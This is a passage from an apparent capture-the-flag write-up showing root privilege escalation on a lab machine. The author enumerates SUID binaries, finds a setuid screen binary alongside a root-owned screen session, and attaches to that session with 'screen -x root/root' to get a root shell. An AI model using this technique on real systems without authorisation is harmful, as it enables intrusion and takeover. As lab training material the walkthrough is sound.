root         852  0.0  0.0   2608  1660 ?        Ss   02:07   0:02      _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done
```
Confirming a bit more i do a search for binary permissions 

``` console
user@Backdoor:/home/user$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/su
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/screen
/usr/bin/umount
/usr/bin/mount
/usr/bin/chsh
/usr/bin/pkexec
user@Backdoor:/home/us
```
``` console
running ls -l

-rwxr-xr-x 1 root   root      63824 May  3  2019  sbverify
-rwxr-xr-x 1 root   root     117040 Jul 23  2021  scp
-rwsr-xr-x 1 root   root     474280 Feb 23  2021  screen
-rwxr-xr-x 1 root   root      14328 May  9  2019  screendump
```

we see screen can be ran by anyone and it has shown up in linpeas. Lets investigate this more. Ensure that you stabolize the shell and run export TERM=term or the privledge escalation will not work. 

``` console
screen -x root/root

root@Backdoor:~# whoami
whoami
root
```


